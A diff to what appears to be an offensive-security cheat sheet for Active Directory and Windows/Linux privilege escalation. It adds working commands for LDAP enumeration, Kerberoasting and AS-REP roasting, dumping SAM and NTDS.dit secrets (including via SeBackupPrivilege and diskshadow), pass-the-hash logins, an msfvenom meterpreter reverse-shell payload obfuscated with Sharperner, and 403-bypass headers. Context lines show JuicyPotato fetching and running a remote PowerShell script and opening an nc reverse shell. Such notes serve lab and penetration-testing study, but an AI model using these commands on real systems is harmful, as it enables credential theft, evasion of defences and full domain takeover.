@@ -156,12 +156,14 @@ onesixtyone -c /path/to/seclists/Discovery/SNMP/snmp-onesixtyone.txt -i ip.txt
 
 ```bash
 # Nmap
-nmap -n -sV --script "ldap\* and not brute" 10.10.10.10
+nmap -n -sV --script "ldap * and not brute" 10.10.10.10
 
 # LdapSearch
 ldapsearch -h 10.10.10.10 -x -b 'DC=bank,DC=local' -s sub
-ldapsearch -LLL -x -H ldap://10.10.10.10 -b '' -s base '(objectclass=\*)'
-ldapsearch -x -h 10.10.10.10 -D 'bank.local\nik' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'
+ldapsearch -LLL -x -H ldap://10.10.10.10 -b '' -s base '(objectclass=*)'
+ldapsearch -x -h 10.10.10.10 -D 'BANK\nik' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'
+ldapsearch -x -h 10.10.10.10 -D 'nik@bank.local' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local'
+ldapsearch -x -h 10.10.10.10 -D 'nik@bank.local' -w 'Password@123!' -b 'CN=Users,DC=bank,DC=local' | grep -i <user> -C 40
 
 ```
 
@@ -820,7 +822,7 @@ pip3 install pypykatz
 
 # Commands
 pypykatz lsa minidump lsass.dmp
-
+pypykatz registry --sam sam system
 ```
 
 ### Crackmapexec
@@ -836,14 +838,19 @@ docker exec -it crackmapexec sh
 ### Impacket Tools
 
 ```bash
-# GetNPUsers.py
+# GetNPUsers.py (AsrepRoasting)
 GetNPUsers.py -dc-ip 10.10.10.10 -request 'bank.local/' -no-pass -usersfile user.txt -format hashcat
 
-# GetUserSPNs.py
+# GetUserSPNs.py (Kerberoasting)
 GetUserSPNs.py bank.local/nik:'Password@123!' -dc-ip 10.10.10.10 -request -outputfile output.txt
+
+# GetADUsers.py
+GetADUsers.py -all bank.local/nik:'Password@123!'-dc-ip 10.10.10.10
 
 # secretsdump.py
 secretsdump.py -just-dc bank.local/nik:'Password@123!'@10.10.10.10
+secretsdump.py -ntds ntds.dit -system system local
+secretsdump.py -ntds ntds.dit -system system local -history
 
 # wmiexec.py
 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:0405e42853c0f2cb0454964601f27bae administrator@10.10.10.10
@@ -1035,6 +1042,53 @@ python3 parse_beacon_config.py beacon.exe
 - Many more
 ```
 
+### Sharperner
+
+```bash
+# Download
+https://github.com/aniqfakhrul/Sharperner
+
+# Commands
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=eth0 LPORT=443 -f base64
+.\Sharperner.exe /file:base64.txt /key:'nothinghere' /out:payload.exe
+
+```
+
+### OffensiveNim
+
+```
+# References
+https://github.com/byt3bl33d3r/OffensiveNim
+```
+
+### Bypass 403 (Forbidden)
+
+```bash
+# Tools
+https://github.com/lobuhi/byp4xx
+https://github.com/iamj0ker/bypass-403
+
+# Header
+X-Originating-IP: 127.0.0.1 
+X-Forwarded-For: 127.0.0.1 
+X-Remote-IP: 127.0.0.1 
+X-Remote-Addr: 127.0.0.1
+```
+
+### Mobsfscan
+
+```bash
+# Download
+https://github.com/MobSF/mobsfscan
+```
+
+### Evil-Winrm
+
+```bash
+# Commands
+evil-winrm -u 'Administrator'  -H '370ddcf45959b2293427baa70376e14e' -i 10.10.10.10
+```
+
 # C. SUID/CAP/SUDO/GROUP
 
 ### LXD
@@ -1136,7 +1190,7 @@ sudo msfconsole -x bash
 
 ```bash
 # Group docker
-docker run -v /:/mnt --rm -it alpine chroot /mnt sh
+
 ```
 
 ### Initctl
@@ -1274,6 +1328,47 @@ SweetPotato.exe -a "whoami"
 wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
 JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
+```
+
+### SeBackupPrivilege 
+
+```bash
+# How to grant this privilege?
+powershell -ep bypass
+Enable-PSRemoting -Force
+Install-Module -Name carbon
+Import-Module carbon
+Grant-CPrivilege -Identity aniq -Privilege SeBackupPrivilege
+Test-CPrivilege -Identity aniq -Privilege SeBackupPrivilege
+
+# Commands (1)
+cd c:\
+mkdir Temp
+reg save hklm\sam c:\Temp\sam
+reg save hklm\system c:\Temp\system
+cd Temp
+download sam
+download system
+pypykatz registry --sam sam system
+
+# Commands (2)
+nano aniq.dsh
+-> set context persistent nowriters
+-> add volume c: alias aniq
+-> create
+-> expose %aniq% z:
+unix2dos aniq.dsh
+cd C:\Temp
+upload aniq.dsh
+diskshadow /s aniq.dsh
+robocopy /b z:\windows\ntds . ntds.dit
+reg save hklm\system c:\Temp\system
+cd C:\Temp
+download ntds.dit
+download system
+
+# References
+https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/
 ```
 
 ### MS11-046
@@ -1464,6 +1559,9 @@ gcc -pthread dirty.c -o dirty -lcrypt
 
 # < 3.19
 - https://www.exploit-db.com/exploits/37292
+
+# <= 4.4.0-116
+- https://www.exploit-db.com/exploits/44298
 
 # < 5.11
 - https://github.com/briskets/CVE-2021-3493
